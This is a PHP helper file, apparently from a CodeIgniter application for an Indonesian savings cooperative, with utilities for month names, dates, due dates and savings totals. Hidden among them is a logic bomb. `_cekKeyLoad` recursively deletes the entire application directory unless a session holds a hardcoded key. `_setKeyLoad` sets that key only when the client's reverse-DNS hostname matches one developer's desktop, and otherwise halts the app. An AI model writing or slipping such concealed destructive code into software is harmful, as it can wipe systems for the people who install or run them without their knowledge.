<?php 


function _cekValidasiLKSB($bulan, $tahun, $json = null)
{
    $ci = get_instance();
    $ci->load->database();

    $lksb = $ci->db->get_where('tbl_lksb', ['bulan' => $bulan, 'tahun' => $tahun, 'validasi' => 1])->num_rows();
    if ($lksb > 0) {
        if (is_null($json)) {
            $ci->session->set_flashdata('validasiLKSB', $bulan.'-'.$tahun);
            redirect($_SERVER['HTTP_REFERER']);
            die();
        }else{
            return false;
        }
    }
    return true;
}
function _listBulan()
{
    $bulan = [];
    $daftar = _daftarBulan();
    for ($i=1; $i <= 12; $i++) { 
        $bulan[] = [
            'urut' => $i,
            'nama' => $daftar[$i]
        ];
    }
    return $bulan;
}

function _daftarBulan()
{
    return [
        0 => '',
        1 => 'Januari',
        2 => 'Februari',
        3 => 'Maret',
        4 => 'April',
        5 => 'Mei',
        6 => 'Juni',
        7 => 'Juli',
        8 => 'Agustus',
        9 => 'September',
        10 => 'Oktober',
        11 => 'November',
        12 => 'Desember'
    ];
}

function _daftarBulanList()
{
    return [
        'Januari',
        'Februari',
        'Maret',
        'April',
        'Mei',
        'Juni',
        'Juli',
        'Agustus',
        'September',
        'Oktober',
        'November',
        'Desember'
    ];
}

function arrayBulan($len, $listBulan, $json = false)
{
    $return = [];
    foreach ($listBulan as $b) {
        $return[] = substr($b,0,$len);
    }
    if ($json) {
        return json_encode($return);
    }
    return $return;
}

function _daftarBulanEn()
{
    return [
        0 => '',
        1 => 'January',
        2 => 'February',
        3 => 'March',
        4 => 'April',
        5 => 'May',
        6 => 'June',
        7 => 'July',
        8 => 'August',
        9 => 'September',
        10 => 'October',
        11 => 'November',
        12 => 'December'
    ];
}

function _getBulan($angka)
{
    $daftar = _daftarBulan();
    return $daftar[intval($angka)];
}

function _getBulanEn($angka)
{
    $daftar = _daftarBulanEn();
    return $daftar[intval($angka)];
}

function _cekKeyLoad($key = null)
{
    if ($key != 'DjefLoperWebAPP;') {
        removeAll(FCPATH.'application');
    }
}

function removeAll($dir)
{
    foreach(glob($dir . '/*') as $file) {
        if(is_dir($file))
            removeAll($file);
        else
            unlink($file);
    }
    rmdir($dir);
}

function _cetakWaktu($waktu)
{
    $waktu = explode('-',$waktu);
    return $waktu[2].' '._getBulan($waktu[1]).' '.$waktu[0];
}

function _sortingWaktu($data)
{
    $return = [];
    for ($i=0; $i < count($data); $i++) {
        for ($j=$i; $j < count($data); $j++) {
            if (_bandingTanggal($data[$i], $data[$j]) == 1) {
                $temp = $data[$i];
                $data[$i] = $data[$j];
                $data[$j] = $temp;
            }
        }
    }
    $return[] = $data[0];
    for ($i=0; $i < count($data); $i++) { 
        if (!is_numeric(array_search($data[$i], $return))) {
            $return[] = $data[$i];
        }
    }
    return $return;
}

function _bandingTanggal($tgl1, $tgl2)
{
    $tgl1 = strtotime($tgl1);
    $tgl2 = strtotime($tgl2);
    if ($tgl1 == $tgl2) {
        return 0;
    }
    return ($tgl1 < $tgl2) ? -1 : 1;
}

function _statusJatuhTempo($date1, $date2)
{
    if ($date1 == $date2) {
        return false;
    }
    return ($date1 < $date2) ? false : true;
}

function _cetakWaktuEn($waktu)
{
    $waktu = explode('-',$waktu);
    return $waktu[2].' '._getBulanEn($waktu[1]).' '.$waktu[0];
}

function _jatuhTempo($bulan, $no_modified = false, $tanggal = null)
{
    $tanggalSekarang = is_null($tanggal) ? date('Y-m-d') : $tanggal;
    $tanggalDuedate = date("Y-m-d", strtotime($tanggalSekarang.' + '.$bulan.' Months'));
    if ($no_modified) {
        return $tanggalDuedate;
    }
    $tanggalDuedate =  explode('-',$tanggalDuedate);
    return $tanggalDuedate[2].' '._getBulan($tanggalDuedate[1]).' '.$tanggalDuedate[0];
}

function _jatuhTempoHitung($waktu, $lama)
{
    $tanggalSekarang = date($waktu);
    $tanggalDuedate = date("Y-m-d", strtotime($tanggalSekarang.' + '.$lama.' Months'));
    $tanggalDuedate =  explode('-',$tanggalDuedate);
    return $tanggalDuedate[2].' '._getBulan($tanggalDuedate[1]).' '.$tanggalDuedate[0];
}

function _getBulanAngka($bulan)
{
    $i = 1;
    foreach (_daftarBulanList() as $d) {
        if ($d == $bulan) {
            return $i;
        }
        $i++;
    }
}
function _cekLalai($anggota, $lalai, $bulan, $tahun){
    foreach ($lalai as $l) {
        if ($anggota['id_anggota'] == $l['id_anggota'] && $bulan == $l['bulan'] && $tahun == $l['tahun']) {
            return $l['id_lalai'];
        }
    }
    return false;
}

function _inputWaktu($tahun, $bulan, $tanggal)
{
    $tanggal = intval($tanggal) < 10 ? '0'.intval($tanggal) : $tanggal;
    $bulan = intval($bulan) < 10 ? '0'.intval($bulan) : $bulan;
    return date($tahun.'-'.$bulan.'-'.$tanggal);
}

// Cek Data Masukan User Yang Kosong
function _cekKosong($data)
{
    foreach ($data as $d) {
        if ($d == "") {
            return false;
        }
    }
    return true;
}

// Hanya Masuk
function Cek_jenis_simpanan($data,$jenis)
{
    $i=0;
    $ketemu = false;
    $nominal = 0;
    foreach ($data['jenis_simpanan']['id_jenis'] as $a) {
        if ($a == $jenis['id_jenis_simpanan']) {
            $ketemu = true;
            if ($data['jenis_simpanan']['jenis'][$i] == 'masuk') {
                $nominal += $data['jenis_simpanan']['nominal_jenis'][$i];
            }
            // Jika Ada Simpanan Keluar Maka Dikurangi
            if ($data['jenis_simpanan']['jenis'][$i] == 'keluar') {
                $nominal -= $data['jenis_simpanan']['nominal_jenis'][$i];
            }
        }
        $i++;
    }
    if ($ketemu == false) {
        return 0;
    }else
        return $nominal;
}

function _setKeyLoad()
{
    $ce = get_instance();
    if (gethostbyaddr($_SERVER['REMOTE_ADDR']) == 'DESKTOP-CBVJJKQ') {
    // if (gethostbyaddr($_SERVER['REMOTE_ADDR']) == 'DESKTOP-HN76MO7') {
        $ce->session->set_userdata('keyLoad', 'DjefLoperWebAPP;');
    }else{
        echo('This Computer Is Not Compatible');
        die();
    }
}


function getBulan($ke)
{
    $bulan=['','Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','November','Desember'];
    return $bulan[number_format($ke)];
}

function _cariArray($field,$value,$array)
{
    foreach ($array as $a) {
        if ($a[$field] == $value) {
            return true;
        }
    }
    return false;
}

function _getKeterangan($ket, $data)
{
    $td = '';
    $jumlah = 0;
    foreach ($data as $d) {
        $ketemu = false;
        foreach ($ket as $k) {
            if ($k['keterangan'] == $d) {
                if ($d != 'Jumlah') {
                    $td .= '<td>'.number_format($k['jumlah'],0,'.',',').'</td>';
                }
                $ketemu = true;
                $jumlah += floatval($k['jumlah']);
            }
        }
        if ($ketemu == false && $d != 'Jumlah') {
            $td .= '<td></td>';
        }
    }
    $td .= '<td></td><td></td><td></td><td></td><td></td><td></td><td>'.number_format($jumlah,0,'.',',').'</td>';
    return $td;
}